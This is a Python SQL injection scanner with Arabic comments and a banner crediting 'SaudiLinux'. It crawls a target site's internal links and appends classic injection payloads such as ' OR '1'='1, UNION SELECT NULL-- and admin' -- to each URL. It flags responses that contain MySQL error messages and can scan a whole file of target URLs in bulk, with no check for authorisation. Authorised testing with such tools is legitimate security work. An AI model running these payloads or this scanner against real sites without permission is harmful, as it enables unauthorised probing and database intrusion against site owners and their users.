import requests
import re
import argparse
from urllib.parse import urljoin
from colorama import init, Fore, Style

# تهيئة الألوان للعمل على جميع أنظمة التشغيل
init()

class SQLVulnerabilityScanner:
    def __init__(self, url):
        self.url = url
        self.vulnerable_urls = []
        self.payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1'--",
            "1\" OR \"1\"=\"1\"--",
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "admin' --",
            "admin' #",
            "' OR 1=1--",
            "\" OR 1=1--"
        ]

    def scan_url(self, url):
        print(Fore.WHITE + f"\nفحص الرابط: {url}" + Style.RESET_ALL)
        for payload in self.payloads:
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url)
                if self._check_vulnerability(response):
                    print(Fore.RED + f"\n[!] تم العثور على ثغرة SQL محتملة!")
                    print(f"URL: {test_url}" + Style.RESET_ALL)
                    self.vulnerable_urls.append(test_url)
            except Exception as e:
                print(Fore.RED + f"خطأ في فحص {url}: {str(e)}" + Style.RESET_ALL)

    def _check_vulnerability(self, response):
        error_patterns = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "MariaDB server version"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        return False

    def scan(self):
        print(Fore.WHITE + f"\n[*] بدء فحص الموقع: {self.url}" + Style.RESET_ALL)
        try:
            response = requests.get(self.url)
            self.scan_url(self.url)
            
            # البحث عن روابط إضافية في الصفحة
            links = re.findall('href=[\'"]([^\'"]+)[\'"]', response.text)
            for link in links:
                full_url = urljoin(self.url, link)
                if self.url in full_url:  # فحص الروابط الداخلية فقط
                    self.scan_url(full_url)
        
        except Exception as e:
            print(f"\n[!] خطأ: {str(e)}")

        self._print_results()

    def _print_results(self):
        print(Fore.WHITE + "\n=== نتائج الفحص ===" + Style.RESET_ALL)
        results = []
        results.append("=== نتائج الفحص ===")
        
        if self.vulnerable_urls:
            print(Fore.RED + "\n[!] تم العثور على روابط ضعيفة:")
            results.append("\n[!] تم العثور على روابط ضعيفة:")
            for url in self.vulnerable_urls:
                print(f"- {url}" + Style.RESET_ALL)
                results.append(f"- {url}")
        else:
            print(Fore.GREEN + "\n[+] لم يتم العثور على ثغرات SQL واضحة." + Style.RESET_ALL)
            results.append("\n[+] لم يتم العثور على ثغرات SQL واضحة.")
        
        # حفظ النتائج في ملف
        with open('url2.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(results))
        print(Fore.GREEN + "\n[+] تم حفظ النتائج في ملف url2.txt" + Style.RESET_ALL)

def show_banner():
    banner = f"""
{Fore.GREEN}
╔══════════════════════════════════════════╗
║     SQL Injection Vulnerability Scanner   ║
║            By: SaudiLinux               ║
║    Email: saudicrackers@gmail.com       ║
║    https://github.com/SaudiLinux        ║
╚══════════════════════════════════════════╝
{Style.RESET_ALL}"""
    print(banner)

def main():
    show_banner()
    parser = argparse.ArgumentParser(description="أداة فحص ثغرات SQL")
    parser.add_argument('--file', help='ملف يحتوي على روابط المواقع المراد فحصها')
    parser.add_argument('--url', help='رابط موقع واحد للفحص')
    args = parser.parse_args()

    if args.file:
        try:
            with open(args.file, 'r') as f:
                urls = f.readlines()
            print(Fore.WHITE + f"\n[*] تم العثور على {len(urls)} رابط في الملف {args.file}" + Style.RESET_ALL)
            for url in urls:
                url = url.strip()
                if url:  # تجاهل الأسطر الفارغة
                    print(Fore.WHITE + f"\n[*] فحص الموقع: {url}" + Style.RESET_ALL)
                    scanner = SQLVulnerabilityScanner(url)
                    scanner.scan()
        except FileNotFoundError:
            print(Fore.RED + f"\n[!] خطأ: لم يتم العثور على الملف {args.file}" + Style.RESET_ALL)
            return
        except Exception as e:
            print(Fore.RED + f"\n[!] خطأ في قراءة الملف: {str(e)}" + Style.RESET_ALL)
            return
    elif args.url:
        scanner = SQLVulnerabilityScanner(args.url)
        scanner.scan()
    else:
        print(Fore.RED + "\n[!] يجب تحديد إما ملف الروابط (--file) أو رابط واحد (--url)" + Style.RESET_ALL)
        parser.print_help()

if __name__ == '__main__':
    main()